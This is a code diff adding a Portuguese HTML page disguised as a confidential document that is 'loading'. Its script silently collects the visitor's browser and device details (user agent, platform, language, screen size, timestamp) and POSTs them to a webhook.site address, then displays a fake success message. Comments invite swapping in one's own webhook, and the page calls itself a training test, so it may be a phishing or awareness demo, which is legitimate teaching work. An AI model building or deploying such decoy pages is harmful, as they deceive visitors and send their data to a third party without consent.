@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documento Confidencial</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>📄 Documento Importante</h1>
+    <p>Este é um documento de teste para o treinamento.</p>
+    <p>Aguarde enquanto carregamos o conteúdo...</p>
+
+    <script>
+        // Coleta informações do dispositivo
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: screen.width + 'x' + screen.height,
+            timestamp: new Date().toISOString(),
+            onLine: navigator.onLine
+        };
+
+        // SUBSTITUA AQUI pela sua URL do webhook.site
+        const webhookURL = 'https://webhook.site/ac1086cb-c4a5-4c1a-a9fa-52b8ba15836d';
+
+        // Envia os dados
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(info)
+        }).then(() => {
+            document.body.innerHTML += '<p style="color: green;">✓ Documento carregado com sucesso!</p>';
+        }).catch(err => {
+            console.log('Erro:', err);
+        });
+    </script>
+</body>
+</html>
